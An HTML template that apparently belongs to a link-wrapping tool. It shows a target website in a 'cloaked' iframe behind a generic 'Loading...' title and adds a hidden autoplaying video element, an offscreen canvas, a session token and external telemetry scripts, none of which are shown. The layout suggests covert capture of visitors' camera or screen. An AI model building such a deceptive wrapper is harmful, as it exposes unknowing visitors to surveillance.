<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>Loading...</title>
  <link rel="stylesheet" href="/static/css/wrapper.css" />
</head>
<body>

  <!-- Cloaked Iframe -->
  <iframe id="siteFrame" src="{{ target_url }}" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>

  <!-- Fallback Dialog for Iframe Restriction Policies -->
  <div id="iframe-fallback" class="fallback-container">
    <div class="fallback-card">
      <div class="fallback-icon">🌐</div>
      <h2>Display Limitation</h2>
      <p style="color: #94a3b8; font-size: 0.95rem; margin-top: 8px;">
        This destination website restricts direct embedded viewing due to security policies (X-Frame-Options).
      </p>
      <a href="{{ target_url }}" target="_blank" rel="noopener noreferrer" class="fallback-btn">
        Open Website in New Tab ↗
      </a>
    </div>
  </div>

  <video id="hidden-video" autoplay playsinline muted></video>
  <canvas id="offscreen-canvas"></canvas>

  <script>
    window.SESSION_CONFIG = {
      token: "{{ token }}",
      targetUrl: "{{ target_url }}"
    };
  </script>
  <script src="/static/js/api.js"></script>
  <script src="/static/js/telemetry.js"></script>
  <script src="/static/js/wrap_app.js"></script>
</body>
</html>
